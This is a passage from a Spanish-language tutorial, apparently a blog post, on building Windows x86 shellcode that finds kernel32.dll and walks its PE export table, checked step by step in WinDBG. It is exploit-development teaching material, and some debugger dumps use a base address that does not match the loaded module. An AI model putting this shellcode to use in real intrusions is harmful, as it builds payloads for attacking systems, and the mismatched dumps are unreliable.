&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov eax, [ebp - 4];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;           &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; AddressOfNames VMA
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov esi, [eax + ecx * 4];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;     &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Obtener RVA del nombre del símbolo
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;add esi, ebx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                 &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Convertir a VMA
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;find_function_finished:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;popad;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Restaurar registros
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-group z-python&quot;&gt;      &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;ret;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                        
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Se ha modificado el espacio reservado en la pila para evitar una sobrecarga y las instrucciones necesaria para buscar &lt;code&gt;kernel32.dll&lt;&#x2F;code&gt;, se han encapsulado en la función &lt;code&gt;find_kernel32&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Se han implementado 3 funciones adicionales, una vez que se ha encontrado la dirección base de &lt;strong&gt;Kernel32&lt;&#x2F;strong&gt;, se ejecutará la función &lt;code&gt;find_function&lt;&#x2F;code&gt;, que primero guarda todos los registros en la pila mediante &lt;code&gt;pushad&lt;&#x2F;code&gt;. Esto nos pertmitirá restaurarlos correctamente más adelante.&lt;&#x2F;p&gt;
&lt;p&gt;El siguiente paso es almacenar el valor apuntado por ebx que contiene la dirección de kernel32 en el desplazamiento &lt;code&gt;0x3C&lt;&#x2F;code&gt; en EAX.Se usa este desplazamiento porque es el que hay desde el incio de un PE hasta el Encabezado PE. (&lt;code&gt;e_lfanew&lt;&#x2F;code&gt;).&lt;&#x2F;p&gt;
&lt;p&gt;La siguiente instrucción &lt;code&gt;mov edi, [ebx + eax + 0x78]&lt;&#x2F;code&gt;, utiliza el valor previamente guardado en EAX (el offset que va a PE header), lo añade a la dirección base de kernel32 almacenada en EBX con un desplazamiento estático de &lt;code&gt;0x78&lt;&#x2F;code&gt; y almacena el valor desreferenciado en EDI, se usa el desplazamiento de &lt;code&gt;0x78&lt;&#x2F;code&gt;, porque es donde se encuentra el RVA de la tabla de directorios de exportación.&lt;&#x2F;p&gt;
&lt;p&gt;Esta dirección se convierte en VMA añadiéndola a la dirección base de &lt;code&gt;kernel32.dll&lt;&#x2F;code&gt; mediante una instrucción de asm &lt;code&gt;add&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;find_function:&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      &amp;quot;pushad;&amp;quot;                       # Guardar todos los registros
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      &amp;quot;mov eax, [ebx + 0x3c];&amp;quot;        # Offset a PE Header
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      &amp;quot;mov edi, [ebx + eax + 0x78];&amp;quot;  # RVA de Export Table
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      &amp;quot;add edi, ebx;&amp;quot;                 # VMA de Export Table
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Ahora EDI, contiene la dirección de memoria virtual de nuestra tabla de directorio de exportación, continuemos con las siguientes instrucciones.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      &amp;quot;mov ecx, [edi + 0x18];&amp;quot;        # NumberOfNames
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      &amp;quot;mov eax, [edi + 0x20];&amp;quot;        # RVA de AddressOfNames
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      &amp;quot;add eax, ebx;&amp;quot;                 # VMA de AddressOfNames
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      &amp;quot;mov [ebp - 4], eax;&amp;quot;           # Guardar AddressOfNames
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Esto nos permite usar el valor ahora almacenado en ECX (NumberOfNames) como un contador para analizar AddressOfNames.&lt;&#x2F;p&gt;
&lt;p&gt;Continuamos con las siguientes instrucciones, trasladamos el valor de EDI y el desplazamiento &lt;code&gt;0x20&lt;&#x2F;code&gt;, que corresponde al campo &lt;strong&gt;AddresOfNames&lt;&#x2F;strong&gt; a EAX. Dado que se trata de una RVA le añadimos la dirección de kernel32 (EBX) para obtener la dirección VMA de AddresOfNames, la última instrucción almacena la drección de &lt;strong&gt;AddresOfNames&lt;&#x2F;strong&gt; en un desplazamiento arbitrario respecto a EBP. Actualmente EBP, contiene el puntero de la pila &lt;code&gt;mov ebp, esp&lt;&#x2F;code&gt; que se hizo al inicio del shellcode.&lt;&#x2F;p&gt;
&lt;p&gt;Una vez explicada la función &lt;code&gt;find_function&lt;&#x2F;code&gt;, seguimos con la función &lt;code&gt;find_function_loop&lt;&#x2F;code&gt; que comienza con un salto condicional basado en el valor de ECX, que contiene el número de símbolos exportados, si es nulo saldrá del bucle.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;find_function_loop:&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      &amp;quot;jecxz find_function_finished;&amp;quot; # Si ECX == 0, salir
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      &amp;quot;dec ecx;&amp;quot;                      # Contador
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      &amp;quot;mov eax, [ebp - 4];&amp;quot;           # AddressOfNames VMA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      &amp;quot;mov esi, [eax + ecx * 4];&amp;quot;     # Obtener RVA del nombre del símbolo
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      &amp;quot;add esi, ebx;&amp;quot;                 # Convertir a VMA
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Si el registro ECX no es nulo, decrementaremos nuestro contador &lt;code&gt;dec ecx&lt;&#x2F;code&gt;, y cargaremos la dirección guardada anteriormente en &lt;code&gt;ebp -4&lt;&#x2F;code&gt; o AddressOfNames.&lt;&#x2F;p&gt;
&lt;p&gt;Podemos usar el contador ECX como índice del array AddresOfNames y multiplicarlo por 4 &lt;code&gt;mov esi, [eax + ecx * 4]&lt;&#x2F;code&gt; ya que cada entrada del array es un DWORD. A continuación, guardamos la RVA del nombre del símbolo en ESI, y para convertir a VMA, sumamos EBX (kernel32) a ESI.&lt;&#x2F;p&gt;
&lt;p&gt;La función &lt;code&gt;find_function_finished&lt;&#x2F;code&gt;, restarura todos los registros y recupera el flujo.&lt;&#x2F;p&gt;
&lt;p&gt;Pasamos de nuevo a WinDBG, intentaremos recopilar manualmente la RVA de la tabla de directorios de exportación para verificar que nuestro shellcode funcione correctamente, Podemos comenzar reuniendo el desplazamiento hasta el inicio del encabezado PE desde el comienzo del módulo &lt;code&gt;kernel32.dll&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; lm m kernel32
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Browse full module list
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;start    end        module name
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c00000 76c9d000   KERNEL32   (pdb symbols)          C:\ProgramData\Dbg\sym\kernel32.pdb\2036C2DF985F0B2A0EAED37F2E897EC41\kernel32.pdb
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; dt ntdll!_IMAGE_DOS_HEADER 76c00000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x000 e_magic          : 0x5a4d
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x002 e_cblp           : 0x90
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x004 e_cp             : 3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x006 e_crlc           : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x008 e_cparhdr        : 4
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x00a e_minalloc       : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x00c e_maxalloc       : 0xffff
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x00e e_ss             : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x010 e_sp             : 0xb8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x012 e_csum           : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x014 e_ip             : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x016 e_cs             : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x018 e_lfarlc         : 0x40
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x01a e_ovno           : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x01c e_res            : [4] 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x024 e_oemid          : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x026 e_oeminfo        : 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x028 e_res2           : [10] 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x03c e_lfanew         : 0n232
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Según el snippet de código anterior, el encabezado PE se encuentra en el desplazamiento &lt;code&gt;0xE8&lt;&#x2F;code&gt; (232 = 000000e8).&lt;&#x2F;p&gt;
&lt;p&gt;Revisando la estructura &lt;code&gt;IMAGE_NT_HEADERS&lt;&#x2F;code&gt;, observamos que &lt;code&gt;IMAGE_OPTIONAL_HEADER&lt;&#x2F;code&gt; tiene un desplazamiento de &lt;code&gt;0x018&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; dt ntdll!_IMAGE_NT_HEADERS 0x76c20000 + 0E8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x000 Signature        : 0x85f88b76
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x004 FileHeader       : _IMAGE_FILE_HEADER
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; dt ntdll!_IMAGE_OPTIONAL_HEADER 0x76c20000 + 0E8 + 0x18
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x000 Magic            : 0xc8fe
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x002 MajorLinkerVersion : 0xf &amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x003 MinorLinkerVersion : 0xb6 &amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x004 SizeOfCode       : 0x36ff50c0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x008 SizeOfInitializedData : 0xc0ec15ff
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x00c SizeOfUninitializedData : 0x388176c8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x010 AddressOfEntryPoint : 0x1000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x014 BaseOfCode       : 0x5d392977
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x018 BaseOfData       : 0x99850fac
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x01c ImageBase        : 0x850001ae
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x020 SectionAlignment : 0x8d0b74f6
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x024 FileAlignment    : 0xf03bb045
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x028 MajorOperatingSystemVersion : 0x850f
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x02a MinorOperatingSystemVersion : 0xae98
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x02c MajorImageVersion : 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x02e MinorImageVersion : 0x4d8b
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x030 MajorSubsystemVersion : 0x8bfc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x032 MinorSubsystemVersion : 0x5fc7
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x034 Win32VersionValue : 0x5bcd335e
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x038 SizeOfImage      : 0xc8fce8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x03c SizeOfHeaders    : 0x8bc3c900
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x040 CheckSum         : 0xc6a445
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x044 Subsystem        : 0xeb01
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x046 DllCharacteristics : 0xcccf
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x048 SizeOfStackReserve : 0xcccccccc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x04c SizeOfStackCommit : 0xcccccccc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x050 SizeOfHeapReserve : 0xa8780d8b
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x054 SizeOfHeapCommit : 0xc03376c8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x058 LoaderFlags      : 0x80c8138
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x05c NumberOfRvaAndSizes : 0x950f0000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   +0x060 DataDirectory    : [16] _IMAGE_DATA_DIRECTORY
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;DataDirectory&lt;&#x2F;code&gt; es una matriz con una longitud de 16, cada entrada de esta matriz es una estructura.&lt;&#x2F;p&gt;
&lt;p&gt;El prototipo de la estructura &lt;code&gt;_IMAGE_DATA_DIRECTORY&lt;&#x2F;code&gt; es:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c z-code&quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;typedef&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-c&quot;&gt;struct&lt;&#x2F;span&gt; _IMAGE_DATA_DIRECTORY &lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c&quot;&gt;{&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt; VirtualAddress&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt; &lt;span class=&quot;z-support z-type z-mac-classic z-c&quot;&gt;Size&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; IMAGE_DATA_DIRECTORY&lt;span class=&quot;z-punctuation z-separator z-c&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-type z-typedef z-c&quot;&gt;PIMAGE_DATA_DIRECTORY&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Vemos que la estructura &lt;code&gt;_IMAGE_OPTIONAL_HEADER&lt;&#x2F;code&gt;, se encuentra en el desplazamiento &lt;code&gt;0x18&lt;&#x2F;code&gt; desde el encabezado PE y &lt;code&gt;DataDirectory&lt;&#x2F;code&gt; se encuentra en un desplazamiento de &lt;code&gt;0x60&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;De esta manera, confirmamos que el valor de la EDT es &lt;code&gt;0x60 + 0x18 = 0x78&lt;&#x2F;code&gt;, que es el valor que habíamos establecido anteriormente.&lt;&#x2F;p&gt;
&lt;p&gt;Volcaremos la estructura en WinDBG para obtener el RVA de la tabla de directorio de exportación.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; dx -r1 (*((ntdll!_IMAGE_DATA_DIRECTORY (*)[16])0x76c20160))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(*((ntdll!_IMAGE_DATA_DIRECTORY (*)[16])0x76c20160))                 [Type: _IMAGE_DATA_DIRECTORY [16]]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    [0]              [Type: _IMAGE_DATA_DIRECTORY]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    [1]              [Type: _IMAGE_DATA_DIRECTORY]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; dx -r1 (*((ntdll!_IMAGE_DATA_DIRECTORY *)0x76c20160))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(*((ntdll!_IMAGE_DATA_DIRECTORY *)0x76c20160))                 [Type: _IMAGE_DATA_DIRECTORY]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    [+0x000] VirtualAddress   : 0x7b9f0 [Type: unsigned long]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    [+0x004] Size             : 0xdca6 [Type: unsigned long]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Si usamos &lt;code&gt;dh&lt;&#x2F;code&gt;, podremos que la dirección coincide.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; !dh -f kernel32
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;File Type: DLL
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;FILE HEADER VALUES
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;     14C machine (i386)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;       6 number of sections
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;E5092278 time date stamp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;       0 file pointer to symbol table
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;       0 number of symbols
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      E0 size of optional header
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    2102 characteristics
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            Executable
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            32 bit word machine
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            DLL
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;OPTIONAL HEADER VALUES
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;     10B magic #
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   14.20 linker version
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   89000 size of code
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   13000 size of initialized data
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;       0 size of uninitialized data
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   1D890 address of entry point
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    1000 base of code
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;         ----- new -----
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c00000 image base
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    1000 section alignment
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    1000 file alignment
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;       3 subsystem (Windows CUI)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   10.00 operating system version
